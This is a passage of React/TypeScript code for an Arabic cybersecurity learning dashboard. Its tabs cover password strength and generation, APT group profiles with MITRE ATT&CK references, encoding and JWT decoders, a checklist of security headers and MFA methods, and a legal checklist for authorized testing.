                  <p className="text-white/35 mb-0.5">⏱ وقت الاختراق (GPU):</p>
                  <p className="font-bold text-red-400">{analysis.crackTime}</p>
                </div>
                <div className="px-3 py-2 rounded-xl text-xs" style={{ background: "#8b5cf612", border: "1px solid #8b5cf625" }}>
                  <p className="text-white/35 mb-0.5">📏 الطول:</p>
                  <p className="font-bold text-purple-400">{pwd.length} حرف</p>
                </div>
              </div>
              {analysis.tips.length > 0 && <div>{analysis.tips.map((t,i) => <p key={i} className="text-xs text-amber-400/70">• {t}</p>)}</div>}
              {hashes && (
                <div className="pt-2 border-t space-y-1" style={{ borderColor: "#ffffff08" }}>
                  <p className="text-xs text-white/25">🔑 التشفير الحقيقي (SubtleCrypto):</p>
                  <div className="flex items-center gap-2">
                    <code className="flex-1 text-xs text-purple-400/70 font-mono truncate" dir="ltr">SHA-256: {hashes.sha256.slice(0,24)}...</code>
                    <CopyButton text={hashes.sha256} />
                  </div>
                  <div className="flex items-center gap-2">
                    <code className="flex-1 text-xs text-pink-400/60 font-mono" dir="ltr">MD5: {hashes.md5}</code>
                    <CopyButton text={hashes.md5} />
                  </div>
                </div>
              )}
              <button onClick={() => checkBreach(pwd)} className="w-full py-2 rounded-lg text-xs font-bold" style={{ background: "#8b5cf612", border: "1px solid #8b5cf630", color: "#8b5cf6" }}>🔍 فحص ضد قوائم التسريبات</button>
              {breach && <p className="text-xs px-2 py-1 rounded" style={{ background: breach.includes("⚠️")?"#ef444412":"#10b98112", color: breach.includes("⚠️")?"#ef4444":"#10b981" }}>{breach}</p>}
            </div>
          )}
        </HoloCard>
      )}

      {activeSubTab === "generator" && (
        <HoloCard color="#8b5cf6" title="🎲 مولّد كلمات مرور آمن" subtitle="يستخدم crypto.getRandomValues() — عشوائي حقيقي">
          <div className="space-y-3">
            <div className="flex items-center gap-3">
              <span className="text-xs text-white/35 w-20">الطول: {genLen}</span>
              <input type="range" min={8} max={64} value={genLen} onChange={e => setGenLen(Number(e.target.value))} className="flex-1 accent-purple-500"/>
            </div>
            <GlowButton color="#8b5cf6" onClick={generatePassword} className="w-full">🎲 توليد كلمة مرور قوية</GlowButton>
            {genPwd && (
              <div>
                <div className="flex items-center gap-2 px-3 py-3 rounded-xl" style={{ background: "#8b5cf615", border: "1px solid #8b5cf630" }}>
                  <code className="flex-1 text-sm text-purple-200 font-mono break-all" dir="ltr">{genPwd}</code>
                  <CopyButton text={genPwd} />
                </div>
                {(() => { const a = calcPasswordStrength(genPwd); return (
                  <p className="text-xs mt-1 font-bold" style={{ color: a.color }}>القوة: {a.label} — وقت الاختراق: {a.crackTime}</p>
                ); })()}
              </div>
            )}
            <div className="grid grid-cols-2 gap-2 mt-2">
              {[["1Password","مجاني للأفراد"],["Bitwarden","مفتوح المصدر"],["KeePass","محلي/أوفلاين"],["Dashlane","متقدم + VPN"]].map(([name,note]) => (
                <div key={name} className="px-2 py-1.5 rounded-lg text-xs" style={{ background: "#8b5cf608", border: "1px solid #8b5cf620" }}>
                  <p className="text-purple-400/80 font-bold">{name}</p>
                  <p className="text-white/30">{note}</p>
                </div>
              ))}
            </div>
          </div>
        </HoloCard>
      )}

      {activeSubTab === "attacks" && (
        <HoloCard color="#8b5cf6" title="⚔️ جدول أساليب هجمات كلمات المرور الكاملة">
          <div className="overflow-x-auto">
            <table className="w-full text-xs">
              <thead><tr style={{ borderBottom: "1px solid #ffffff10" }}>
                {["التقنية","الأداة","الحماية","السرعة"].map(h => <th key={h} className="text-right py-1.5 pr-2 text-white/35 font-normal">{h}</th>)}
              </tr></thead>
              <tbody>
                {ATTACK_TABLE.map((row, i) => (
                  <tr key={i} style={{ borderBottom: "1px solid #ffffff06" }}>
                    <td className="py-1.5 pr-2 text-purple-400/80">{row.tech}</td>
                    <td className="py-1.5 pr-2 text-amber-400/70 font-mono">{row.tool}</td>
                    <td className="py-1.5 pr-2 text-emerald-400/70">{row.protect}</td>
                    <td className="py-1.5 pr-2 text-red-400/60 font-mono">{row.speed}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </HoloCard>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 4 — APT INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════

const APT_GROUPS = [
  { name: "APT29 (Cozy Bear)",    origin: "🇷🇺 روسيا",       target: "حكومات، دفاع، طاقة",  technique: "Spear Phishing + Supply Chain", ttps: ["T1566.001","T1195","T1078"], color: "#ef4444" },
  { name: "APT41 (Winnti)",       origin: "🇨🇳 الصين",        target: "ألعاب، صحة، تقنية",   technique: "Zero-Day + Watering Hole",     ttps: ["T1190","T1189","T1133"], color: "#f59e0b" },
  { name: "Lazarus Group",        origin: "🇰🇵 كوريا الشمالية", target: "بنوك، بورصات، عملات رقمية", technique: "SWIFT Attacks + Ransomware", ttps: ["T1059","T1071","T1486"], color: "#8b5cf6" },
  { name: "FIN7",                 origin: "🌍 أوروبا الشرقية", target: "مطاعم، ضيافة، تجزئة", technique: "Spear Phish + POS Malware",    ttps: ["T1566","T1204","T1055"], color: "#06b6d4" },
  { name: "REvil/Sodinokibi",     origin: "🌍 غير محدد",      target: "شركات عالمية",         technique: "Ransomware-as-a-Service",      ttps: ["T1486","T1490","T1489"], color: "#ec4899" },
  { name: "DarkSide",             origin: "🌍 غير محدد",      target: "بنية تحتية + نفط",    technique: "Double Extortion Ransomware",  ttps: ["T1486","T1083","T1560"], color: "#f97316" },
];

const APT_PHASES = [
  { eng: "Reconnaissance",  nameAr: "الاستطلاع",         icon: "🕵️", color: "#06b6d4", desc: "OSINT: Shodan/LinkedIn/GitHub، جمع معلومات مفتوحة" },
  { eng: "Weaponization",   nameAr: "تسليح الحمولة",    icon: "⚔️", color: "#ef4444", desc: "بناء payload، استغلال CVE، تخصيص implant" },
  { eng: "Delivery",        nameAr: "التسليم",           icon: "📧", color: "#f59e0b", desc: "Spear Phishing، Watering Hole، USB Drop" },
  { eng: "Exploitation",    nameAr: "الاستغلال",         icon: "💥", color: "#f97316", desc: "تشغيل الثغرة: Zero-Day، N-Day exploit" },
  { eng: "Installation",    nameAr: "التثبيت",           icon: "🔩", color: "#8b5cf6", desc: "Backdoor، Rootkit، Scheduled Task persistence" },
  { eng: "C2",              nameAr: "القيادة والسيطرة",  icon: "📡", color: "#ec4899", desc: "C2 Server، DNS Tunneling، HTTPS Beaconing" },
  { eng: "Actions on Obj.", nameAr: "التنفيذ",           icon: "🎯", color: "#10b981", desc: "Data Exfiltration، Lateral Movement، Encryption" },
];

const MITRE_TACTICS = [
  { id: "TA0001", name: "Initial Access", techniques: ["T1566 Phishing","T1190 Public-Facing App","T1195 Supply Chain"] },
  { id: "TA0002", name: "Execution",      techniques: ["T1059 Command Scripting","T1204 User Execution","T1053 Scheduled Task"] },
  { id: "TA0003", name: "Persistence",    techniques: ["T1078 Valid Accounts","T1098 Account Manip.","T1136 Create Account"] },
  { id: "TA0005", name: "Defense Evasion", techniques: ["T1027 Obfuscation","T1055 Process Injection","T1562 Impair Defenses"] },
  { id: "TA0009", name: "Collection",     techniques: ["T1560 Archive Data","T1083 File Discovery","T1114 Email Collection"] },
  { id: "TA0010", name: "Exfiltration",   techniques: ["T1048 Alt Protocol","T1567 Web Service","T1030 Data Transfer Limits"] },
];

function AptTab() {
  const [selectedGroup, setSelectedGroup] = useState(0);
  const [killchainStep, setKillchainStep] = useState(-1);
  const [running, setRunning] = useState(false);
  const [activeMitre, setActiveMitre] = useState("TA0001");

  function runKillchain() {
    setRunning(true); setKillchainStep(-1);
    APT_PHASES.forEach((_, i) => setTimeout(() => { setKillchainStep(i); if (i===APT_PHASES.length-1) setRunning(false); }, i*600+400));
  }

  const group = APT_GROUPS[selectedGroup];
  const mitreTactic = MITRE_TACTICS.find(m => m.id === activeMitre)!;

  return (
    <div className="space-y-5">
      <HoloCard color="#ec4899" title="🎯 محاكي Cyber Kill Chain — Lockheed Martin">
        <div className="flex justify-between items-end gap-1 mb-3">
          {APT_PHASES.map((p, i) => (
            <div key={i} className="flex flex-col items-center gap-1 flex-1">
              <motion.div animate={{ scale: killchainStep>=i?1.1:1, opacity: killchainStep>=i?1:0.25 }}
                className="w-7 h-7 rounded-full flex items-center justify-center text-sm border transition-all"
                style={{ background: killchainStep>=i?`${p.color}20`:"#ffffff04", borderColor: killchainStep>=i?p.color:"#ffffff12" }}>
                {p.icon}
              </motion.div>
              <span style={{ fontSize: "7px", color: killchainStep>=i?p.color:"#ffffff25", textAlign: "center", lineHeight: "1.2" }}>{p.nameAr}</span>
            </div>
          ))}
        </div>
        <AnimatePresence mode="wait">
          {killchainStep >= 0 && (
            <motion.div key={killchainStep} initial={{ opacity: 0, y: 4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
              className="px-3 py-2 rounded-lg text-xs mb-3" style={{ background: `${APT_PHASES[killchainStep].color}12`, border: `1px solid ${APT_PHASES[killchainStep].color}30` }}>
              <p className="font-bold" style={{ color: APT_PHASES[killchainStep].color }}>{APT_PHASES[killchainStep].eng} — {APT_PHASES[killchainStep].nameAr}</p>
              <p className="text-white/45 mt-0.5">{APT_PHASES[killchainStep].desc}</p>
            </motion.div>
          )}
        </AnimatePresence>
        <GlowButton color="#ec4899" onClick={runKillchain} loading={running} className="w-full">
          {running ? "⏳ جارٍ المحاكاة..." : "▶ محاكاة الـ Kill Chain الكاملة"}
        </GlowButton>
      </HoloCard>

      <HoloCard color="#ec4899" title="🌍 قاعدة بيانات مجموعات APT">
        <div className="flex flex-wrap gap-1.5 mb-3">
          {APT_GROUPS.map((g, i) => (
            <button key={i} onClick={() => setSelectedGroup(i)}
              className="px-2 py-1 rounded text-xs transition-all"
              style={{ background: selectedGroup===i?`${g.color}20`:"#ffffff08", border:`1px solid ${selectedGroup===i?g.color:"#ffffff15"}`, color: selectedGroup===i?g.color:"#ffffff40" }}>
              {g.name.split(" ")[0]}
            </button>
          ))}
        </div>
        <div className="space-y-2">
          {[["المجموعة",group.name,group.color],["الأصل",group.origin,"#ffffff70"],["الهدف",group.target,"#06b6d4"],["الأسلوب",group.technique,"#f59e0b"]].map(([l,v,c]) => (
            <div key={String(l)} className="flex justify-between gap-2 text-xs">
              <span className="text-white/30">{l}:</span>
              <span className="font-mono text-right" style={{ color: String(c) }}>{String(v)}</span>
            </div>
          ))}
          <div className="flex flex-wrap gap-1 pt-1">
            {group.ttps.map(t => <span key={t} className="px-1.5 py-0.5 rounded text-xs font-mono" style={{ background: "#ef444415", color: "#ef4444" }}>{t}</span>)}
          </div>
        </div>
      </HoloCard>

      <HoloCard color="#ec4899" title="🗺️ MITRE ATT&CK Framework — مرجع سريع">
        <div className="flex flex-wrap gap-1 mb-3">
          {MITRE_TACTICS.map(m => (
            <button key={m.id} onClick={() => setActiveMitre(m.id)}
              className="px-2 py-0.5 rounded text-xs transition-all"
              style={{ background: activeMitre===m.id?"#ec489920":"#ffffff06", border:`1px solid ${activeMitre===m.id?"#ec4899":"#ffffff12"}`, color: activeMitre===m.id?"#ec4899":"#ffffff35" }}>
              {m.id}
            </button>
          ))}
        </div>
        <p className="text-xs font-bold text-pink-400/80 mb-2">{mitreTactic.name}</p>
        <div className="space-y-1">
          {mitreTactic.techniques.map((t, i) => (
            <div key={i} className="flex items-center gap-2 text-xs px-2 py-1 rounded" style={{ background: "#ec489908" }}>
              <span className="font-mono text-white/30">{t.split(" ")[0]}</span>
              <span className="text-white/55">{t.split(" ").slice(1).join(" ")}</span>
            </div>
          ))}
        </div>
      </HoloCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 5 — REVERSE ENGINEERING
// ═══════════════════════════════════════════════════════════════════

function ReverseTab() {
  const [b64input, setB64input] = useState(""); const [b64result, setB64result] = useState("");
  const [jwtInput, setJwtInput] = useState(""); const [jwtResult, setJwtResult] = useState<{header:object;payload:object;sig:string}|null>(null); const [jwtErr, setJwtErr] = useState("");
  const [urlInput, setUrlInput] = useState(""); const [urlResult, setUrlResult] = useState<string[]>([]);
  const [hexInput, setHexInput] = useState(""); const [hexResult, setHexResult] = useState("");
  const [regexPat, setRegexPat] = useState(""); const [regexStr, setRegexStr] = useState(""); const [regexResult, setRegexResult] = useState<string|null>(null);

  function decodeB64(encode: boolean) {
    try { setB64result(encode ? btoa(unescape(encodeURIComponent(b64input))) : decodeURIComponent(escape(atob(b64input)))); }
    catch { setB64result("❌ تنسيق غير صالح"); }
  }
  function decodeJWT() {
    try {
      const parts = jwtInput.trim().split(".");
      if (parts.length!==3) { setJwtErr("JWT يحتاج 3 أجزاء"); setJwtResult(null); return; }
      const dec = (s:string) => JSON.parse(decodeURIComponent(escape(atob(s.replace(/-/g,"+").replace(/_/g,"/")))));
      setJwtResult({ header: dec(parts[0]), payload: dec(parts[1]), sig: parts[2].slice(0,20)+"..." });
      setJwtErr("");
    } catch { setJwtErr("❌ JWT غير صالح"); setJwtResult(null); }
  }
  function analyzeURL() {
    try {
      const u = new URL(urlInput.startsWith("http")?urlInput:"https://"+urlInput);
      setUrlResult([`البروتوكول: ${u.protocol}`,`النطاق: ${u.hostname}`,`المنفذ: ${u.port||"افتراضي"}`,`المسار: ${u.pathname}`,`المتغيرات: ${u.searchParams.toString()||"لا يوجد"}`,`الهاش: ${u.hash||"لا يوجد"}`,`TLD: .${u.hostname.split(".").pop()}`,`Subdomains: ${u.hostname.split(".").length-2}`]);
    } catch { setUrlResult(["❌ URL غير صالح"]); }
  }
  function hexDecode() {
    try {
      const hex = hexInput.replace(/\s/g,"").replace(/^0x/i,"");
      if (/^[0-9a-f]+$/i.test(hex)) setHexResult(hex.match(/.{2}/g)!.map(b=>String.fromCharCode(parseInt(b,16))).join(""));
      else setHexResult("❌ هذا ليس hex صحيح");
    } catch { setHexResult("❌ خطأ في التحويل"); }
  }
  function testRegex() {
    try {
      const re = new RegExp(regexPat, "g");
      const matches = Array.from(regexStr.matchAll(re));
      if (matches.length===0) setRegexResult("❌ لا تطابق");
      else setRegexResult(`✅ ${matches.length} تطابق: ${matches.map(m=>`"${m[0]}" (في ${m.index})`).join(", ")}`);
    } catch(e) { setRegexResult(`❌ خطأ في التعبير: ${e}`); }
  }

  return (
    <div className="space-y-5">
      <HoloCard color="#06b6d4" title="🔑 فكّاك JWT" subtitle="تحليل JSON Web Tokens بدون مفتاح توقيع">
        <textarea value={jwtInput} onChange={e=>setJwtInput(e.target.value)}
          placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMifQ.abc..."
          className="w-full bg-black/50 border border-cyan-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono resize-none" rows={2} dir="ltr"/>
        <GlowButton color="#06b6d4" onClick={decodeJWT} className="mt-2">فكّ JWT</GlowButton>
        {jwtErr && <p className="text-xs text-red-400 mt-1">{jwtErr}</p>}
        {jwtResult && (
          <div className="mt-2 space-y-2">
            {(["header","payload"] as const).map(k => (
              <div key={k} className="px-3 py-2 rounded-lg" style={{ background: "#06b6d412", border: "1px solid #06b6d425" }}>
                <p className="text-xs text-cyan-400/50 mb-1">{k==="header"?"🎩 Header":"📦 Payload"}:</p>
                <pre className="text-xs text-cyan-300/80 overflow-x-auto" dir="ltr">{JSON.stringify(jwtResult[k],null,2)}</pre>
              </div>
            ))}
            <p className="text-xs text-white/25 font-mono" dir="ltr">Signature: {jwtResult.sig}</p>
          </div>
        )}
      </HoloCard>

      <HoloCard color="#06b6d4" title="📦 Base64 + Hex Decoder">
        <p className="text-xs text-white/30 mb-2">Base64:</p>
        <textarea value={b64input} onChange={e=>setB64input(e.target.value)} rows={2} dir="auto"
          placeholder="أدخل نصاً أو Base64 هنا..."
          className="w-full bg-black/50 border border-cyan-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono resize-none"/>
        <div className="flex gap-2 mt-1.5 mb-3">
          <GlowButton color="#06b6d4" onClick={()=>decodeB64(true)}>تشفير B64</GlowButton>
          <GlowButton color="#8b5cf6" onClick={()=>decodeB64(false)}>فكّ B64</GlowButton>
        </div>
        {b64result && <div className="flex items-center gap-2 px-3 py-2 rounded-lg mb-3" style={{ background: "#06b6d410", border: "1px solid #06b6d425" }}><code className="flex-1 text-xs text-cyan-300 font-mono break-all" dir="ltr">{b64result}</code><CopyButton text={b64result}/></div>}
        <p className="text-xs text-white/30 mb-2">Hex Decoder:</p>
        <div className="flex gap-2">
          <input value={hexInput} onChange={e=>setHexInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&hexDecode()}
            placeholder="48 65 6C 6C 6F  أو  48656c6c6f"
            className="flex-1 bg-black/50 border border-cyan-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
          <GlowButton color="#06b6d4" onClick={hexDecode}>Decode</GlowButton>
        </div>
        {hexResult && <p className="text-xs mt-1.5 px-2 py-1 rounded font-mono" style={{ background: "#06b6d410", color: "#06b6d4" }} dir="auto">{hexResult}</p>}
      </HoloCard>

      <HoloCard color="#06b6d4" title="🌐 محلل URL الكامل">
        <div className="flex gap-2">
          <input value={urlInput} onChange={e=>setUrlInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&analyzeURL()}
            placeholder="https://api.example.com:8080/v2/users?id=123#section"
            className="flex-1 bg-black/50 border border-cyan-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
          <GlowButton color="#06b6d4" onClick={analyzeURL}>تحليل</GlowButton>
        </div>
        {urlResult.length>0 && (
          <div className="mt-2 grid grid-cols-2 gap-1.5">
            {urlResult.map((r,i)=>{ const [l,...rest]=r.split(": "); return (
              <div key={i} className="px-2 py-1.5 rounded text-xs" style={{ background: "#06b6d408", border: "1px solid #06b6d418" }}>
                <span className="text-white/30">{l}: </span><span className="text-cyan-400/80 font-mono">{rest.join(": ")}</span>
              </div>
            );})}
          </div>
        )}
      </HoloCard>

      <HoloCard color="#06b6d4" title="🔍 محرّك Regex — تحليل التعابير النمطية">
        <div className="space-y-2">
          <div>
            <p className="text-xs text-white/30 mb-1">Pattern:</p>
            <input value={regexPat} onChange={e=>setRegexPat(e.target.value)}
              placeholder="\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b"
              className="w-full bg-black/50 border border-cyan-500/30 rounded-lg px-3 py-1.5 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
          </div>
          <div>
            <p className="text-xs text-white/30 mb-1">النص للاختبار:</p>
            <textarea value={regexStr} onChange={e=>setRegexStr(e.target.value)} rows={2} dir="auto"
              placeholder="اكتب النص هنا لاختبار التعبير النمطي..."
              className="w-full bg-black/50 border border-cyan-500/30 rounded-lg px-3 py-1.5 text-xs text-white placeholder:text-white/15 outline-none font-mono resize-none"/>
          </div>
          <GlowButton color="#06b6d4" onClick={testRegex}>اختبار Regex</GlowButton>
          {regexResult && <p className="text-xs px-2 py-1 rounded" style={{ background: regexResult.startsWith("✅")?"#10b98110":"#ef444410", color: regexResult.startsWith("✅")?"#10b981":"#ef4444" }}>{regexResult}</p>}
        </div>
        <div className="mt-3 pt-2 border-t" style={{ borderColor: "#ffffff08" }}>
          <p className="text-xs text-white/25 mb-1">أنماط شائعة:</p>
          <div className="flex flex-wrap gap-1">
            {[["Email","[\\w.-]+@[\\w.-]+\\.[a-z]{2,}"],["IPv4","\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b"],["URL","https?://[^\\s]+"],["CVE","CVE-[0-9]{4}-[0-9]+"],["JWT","[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"]].map(([label,pat])=>(
              <button key={label} onClick={()=>setRegexPat(pat)}
                className="px-2 py-0.5 rounded text-xs transition-colors"
                style={{ background: "#06b6d410", color: "#06b6d470", border: "1px solid #06b6d425" }}>{label}</button>
            ))}
          </div>
        </div>
      </HoloCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 6 — DEFENSE MECHANISMS
// ═══════════════════════════════════════════════════════════════════

const SECURITY_HEADERS = [
  { h: "Content-Security-Policy",     abbr: "CSP",  crit: true,  desc: "يمنع XSS وحقن الكود الخارجي",     ex: "default-src 'self'; script-src 'nonce-xyz'" },
  { h: "Strict-Transport-Security",   abbr: "HSTS", crit: true,  desc: "يجبر HTTPS لمدة محددة",           ex: "max-age=31536000; includeSubDomains; preload" },
  { h: "X-Frame-Options",             abbr: "XFO",  crit: true,  desc: "يمنع Clickjacking / iframe",      ex: "DENY" },
  { h: "X-Content-Type-Options",      abbr: "XCTO", crit: false, desc: "يمنع MIME Sniffing",              ex: "nosniff" },
  { h: "Permissions-Policy",          abbr: "PP",   crit: false, desc: "يتحكم بصلاحيات المتصفح",         ex: "camera=(), microphone=(), geolocation=()" },
  { h: "Referrer-Policy",             abbr: "RP",   crit: false, desc: "يتحكم بمعلومات الـ referrer",     ex: "strict-origin-when-cross-origin" },
  { h: "Cross-Origin-Opener-Policy",  abbr: "COOP", crit: false, desc: "يعزل origin من نوافذ أخرى",       ex: "same-origin" },
  { h: "Cross-Origin-Resource-Policy",abbr: "CORP", crit: false, desc: "يمنع cross-origin embedding",     ex: "same-site" },
];

const MFA_METHODS = [
  { name: "FIDO2 / WebAuthn",     strength: 99, type: "🔑", color: "#06b6d4", pros: "مقاوم Phishing بالكامل",  cons: "يحتاج جهاز داعم" },
  { name: "Passkeys",             strength: 98, type: "🔐", color: "#8b5cf6", pros: "لا كلمة مرور أصلاً",      cons: "دعم محدود حالياً" },
  { name: "TOTP (Google Auth)",   strength: 92, type: "🕐", color: "#10b981", pros: "مجاني + يعمل أوفلاين",    cons: "يُفقد مع الهاتف" },
  { name: "Hardware Key (YubiKey)", strength: 99, type: "💾", color: "#f59e0b", pros: "أقوى حماية مادية",      cons: "تكلفة مادية" },
  { name: "Push Notification",    strength: 75, type: "🔔", color: "#ec4899", pros: "سهل الاستخدام",           cons: "MFA Fatigue Attack" },
  { name: "SMS OTP",              strength: 50, type: "📱", color: "#f97316", pros: "متاح للجميع",             cons: "عرضة لـ SIM Swap" },
  { name: "Email OTP",            strength: 40, type: "📧", color: "#ef4444", pros: "بسيط وسريع",             cons: "خطر اختراق الإيميل" },
];

function DefenseTab() {
  const [checked, setChecked] = useState<Record<string,boolean>>({});
  const [cspDirective, setCspDirective] = useState({ defaultSrc: "'self'", scriptSrc: "'self'", styleSrc: "'self'", imgSrc: "'self' data:", connectSrc: "'self'" });
  const [showCSP, setShowCSP] = useState(false);

  const score = SECURITY_HEADERS.filter(h=>checked[h.abbr]).length;
  const secPct = Math.round((score/SECURITY_HEADERS.length)*100);

  const generatedCSP = Object.entries(cspDirective).map(([k,v])=>{
    const directive = k.replace(/([A-Z])/g,"-$1").toLowerCase().replace("default-src","default-src").replace("script-src","script-src").replace("style-src","style-src").replace("img-src","img-src").replace("connect-src","connect-src");
    return `${directive} ${v}`;
  }).join("; ");

  return (
    <div className="space-y-5">
      <HoloCard color="#10b981" title="🛡️ Security Headers Checklist" subtitle="ضع علامة ✓ على كل header مُطبَّق في موقعك">
        <div className="mb-3">
          <div className="flex justify-between text-xs mb-1">
            <span className="text-white/35">نسبة الاكتمال:</span>
            <span className="font-bold" style={{ color: secPct>70?"#10b981":secPct>40?"#f59e0b":"#ef4444" }}>{secPct}% ({score}/{SECURITY_HEADERS.length})</span>
          </div>
          <div className="h-2 rounded-full bg-white/10 overflow-hidden">
            <motion.div className="h-full rounded-full" animate={{ width: `${secPct}%` }}
              style={{ background: secPct>70?"linear-gradient(90deg,#10b981,#06b6d4)":secPct>40?"linear-gradient(90deg,#f59e0b,#ef4444)":"#ef4444" }}/>
          </div>
        </div>
        <div className="space-y-1.5">
          {SECURITY_HEADERS.map(h => (
            <div key={h.abbr} onClick={()=>setChecked(p=>({...p,[h.abbr]:!p[h.abbr]}))}
              className="flex items-start gap-2 px-3 py-2 rounded-lg cursor-pointer transition-all hover:bg-white/5"
              style={{ background: checked[h.abbr]?"#10b98110":"#ffffff04", border:`1px solid ${checked[h.abbr]?"#10b98130":"#ffffff08"}` }}>
              <div className="w-4 h-4 rounded border flex-shrink-0 flex items-center justify-center text-xs mt-0.5"
                style={{ borderColor: checked[h.abbr]?"#10b981":"#ffffff20", background: checked[h.abbr]?"#10b981":"transparent" }}>
                {checked[h.abbr]&&"✓"}
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-1.5">
                  <span className="text-xs font-mono text-white/80">{h.h}</span>
                  {h.crit&&<span className="text-red-400/60 text-xs">مهم</span>}
                </div>
                <p className="text-xs text-white/30">{h.desc}</p>
                <code className="text-xs text-emerald-400/50 font-mono">{h.ex}</code>
              </div>
            </div>
          ))}
        </div>
      </HoloCard>

      <HoloCard color="#10b981" title="⚙️ منشئ Content Security Policy" subtitle="ابنِ CSP header خاصتك بسهولة">
        <div className="space-y-2 mb-3">
          {Object.entries(cspDirective).map(([k,v]) => (
            <div key={k} className="flex items-center gap-2">
              <span className="text-xs text-white/35 w-24 flex-shrink-0">{k}:</span>
              <input value={v} onChange={e=>setCspDirective(p=>({...p,[k]:e.target.value}))}
                className="flex-1 bg-black/50 border border-emerald-500/20 rounded px-2 py-1 text-xs text-white placeholder:text-white/15 outline-none focus:border-emerald-400/40 font-mono" dir="ltr"/>
            </div>
          ))}
        </div>
        <button onClick={()=>setShowCSP(!showCSP)} className="text-xs text-emerald-400/70 hover:text-emerald-400 transition-colors mb-2">
          {showCSP?"▼ إخفاء":"▶ إظهار"} الـ Header المولَّد
        </button>
        {showCSP && (
          <div className="flex items-start gap-2 px-3 py-2 rounded-lg" style={{ background: "#10b98110", border: "1px solid #10b98125" }}>
            <code className="flex-1 text-xs text-emerald-300 font-mono break-all" dir="ltr">Content-Security-Policy: {generatedCSP}</code>
            <CopyButton text={`Content-Security-Policy: ${generatedCSP}`}/>
          </div>
        )}
      </HoloCard>

      <HoloCard color="#10b981" title="🔐 مقارنة طرق MFA/2FA" subtitle="مرتبة من الأقوى إلى الأضعف">
        <div className="space-y-2">
          {MFA_METHODS.sort((a,b)=>b.strength-a.strength).map((m,i)=>(
            <div key={i} className="px-3 py-2 rounded-xl border" style={{ background:`${m.color}08`, borderColor:`${m.color}20` }}>
              <div className="flex items-center justify-between mb-1">
                <div className="flex items-center gap-2"><span>{m.type}</span><span className="text-xs font-bold text-white/80">{m.name}</span></div>
                <span className="text-xs font-bold font-mono" style={{ color: m.color }}>{m.strength}%</span>
              </div>
              <div className="h-1 rounded-full bg-white/10 mb-1.5 overflow-hidden"><div className="h-full rounded-full" style={{ width:`${m.strength}%`, background:m.color }}/></div>
              <div className="grid grid-cols-2 gap-2"><p className="text-xs text-emerald-400/70">✓ {m.pros}</p><p className="text-xs text-red-400/70">✗ {m.cons}</p></div>
            </div>
          ))}
        </div>
      </HoloCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 7 — LEGAL FRAMEWORK
// ═══════════════════════════════════════════════════════════════════

const LEGAL_ITEMS = [
  { id: "auth",    label: "حصلت على إذن خطي مسبق من مالك النظام",            req: true },
  { id: "scope",   label: "النطاق محدد (IPs/Domains المسموح بها فقط)",        req: true },
  { id: "time",    label: "الوقت الزمني للاختبار محدد ومتفق عليه",           req: true },
  { id: "report",  label: "الالتزام بتسليم تقرير كامل عن الثغرات",           req: true },
  { id: "destruct", label: "حذف جميع البيانات المستخرجة بعد الاختبار",       req: true },
  { id: "nda",     label: "اتفاقية عدم الكشف (NDA) موقّعة مع الجهة",        req: false },
  { id: "backup",  label: "نسخ احتياطية للأنظمة قبل بدء الاختبار",          req: false },
  { id: "team",    label: "فريق استجابة جاهز أثناء الاختبار",                req: false },
  { id: "notify",  label: "إبلاغ الموظفين المعنيين بوجود الاختبار",          req: false },
];

const LAWS = [
  { country: "🇸🇦 المملكة العربية السعودية", law: "نظام مكافحة الجرائم المعلوماتية 2007",   penalty: "سجن 4 سنوات + غرامة مليون ريال" },
  { country: "🇦🇪 الإمارات",                 law: "قانون مكافحة الجرائم الإلكترونية 2021",  penalty: "سجن + غرامة 3-5 مليون درهم" },
  { country: "🇪🇬 مصر",                      law: "قانون مكافحة الجرائم الإلكترونية 2018",  penalty: "سجن + غرامة 200,000 جنيه" },
  { country: "🇺🇸 الولايات المتحدة",         law: "CFAA — Computer Fraud and Abuse Act",     penalty: "سجن حتى 10 سنوات" },
  { country: "🇬🇧 المملكة المتحدة",           law: "Computer Misuse Act 1990",                penalty: "سجن حتى 10 سنوات" },
  { country: "🇪🇺 الاتحاد الأوروبي",         law: "Directive on Attacks Against IS 2013",    penalty: "سجن 2-5 سنوات حسب الدولة" },
];

const PLATFORMS = [
  { name: "HackerOne",   type: "Bug Bounty",   url: "hackerone.com",   icon: "🏴‍☠️", desc: "أكبر منصة Bug Bounty عالمية" },
  { name: "Bugcrowd",    type: "Bug Bounty",   url: "bugcrowd.com",    icon: "🐛", desc: "ثانية أكبر منصة مكافآت" },
  { name: "HackTheBox",  type: "CTF / Lab",    url: "hackthebox.com",  icon: "📦", desc: "أشهر منصة تدريب هجومي" },
  { name: "TryHackMe",   type: "CTF / Lab",    url: "tryhackme.com",   icon: "🎮", desc: "للمبتدئين والمتقدمين" },
  { name: "VulnHub",     type: "VM Lab",       url: "vulnhub.com",     icon: "💻", desc: "VMs معرّضة للتدريب" },
  { name: "Intigriti",   type: "Bug Bounty",   url: "intigriti.com",   icon: "🏆", desc: "منصة أوروبية رائدة" },
];

function LegalTab() {
  const [checked, setChecked] = useState<Record<string,boolean>>({});
  const reqDone = LEGAL_ITEMS.filter(c=>c.req&&checked[c.id]).length;
  const reqTotal = LEGAL_ITEMS.filter(c=>c.req).length;
